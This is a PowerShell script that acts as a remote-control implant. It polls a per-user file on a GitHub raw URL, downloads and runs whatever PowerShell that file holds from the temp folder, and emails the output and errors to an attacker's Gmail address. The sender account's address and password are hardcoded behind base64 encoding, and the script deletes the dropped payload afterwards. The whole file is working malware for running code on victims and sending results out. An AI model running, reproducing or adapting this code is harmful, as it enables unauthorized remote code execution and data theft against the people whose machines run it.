function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
    $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
    $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
    $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
    $Password = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PasswordEnc))
    $message = new-object Net.Mail.MailMessage;
    $message.From = $Username;
    $message.To.Add($email);
    $message.Subject = $subj;
    $message.Body = $body;
    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
 }
 
 function Get-UrlStatusCode([string] $Url)
{
    try
    {
        (Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive).StatusCode
    }
    catch [Net.WebException]
    {
        [int]$_.Exception.Response.StatusCode
    }
}
$name = $env:username
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
$receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
$statusCode = Get-UrlStatusCode $url
if ($statusCode -eq 200){
    $contentLocal = "False"
    $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
    $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
    if(($contentWeb -eq "Online") -or ($contentWeb -eq "Online`n")){
        Send-ToEmail -email $receiver -body $name -subj "Online"
        exit
    }
    elseif($diff) {
        $file="$env:tmp\cd.ps1"
        try {
            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
            # start powershell {powershell -file $file} -RedirectStandardOutput lg.txt -RedirectStandardError er.txt
            $runn = powershell -file $file 2>&1 | Out-String
            if($?){
                # $runn = Get-Content -Path .\lg.txt
                # remove-item -force -path .\lg.txt
                $res=$contentWeb + [Environment]::NewLine + $runn
                $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don

            }
        } catch {
            $err = $_ | Out-String
            # $err = Get-Content -Path .\er.txt
            # remove-item -force -path .\er.txt
            $suberr = "Error - "+$name
            Send-ToEmail -email $receiver -body $err -subj $suberr
        }
        finally {
            Remove-Item -Path $file -Force
        }
    } 

} else {
    Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
}
# $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
# Invoke-Expression $contentWeb -ErrorAction Stop
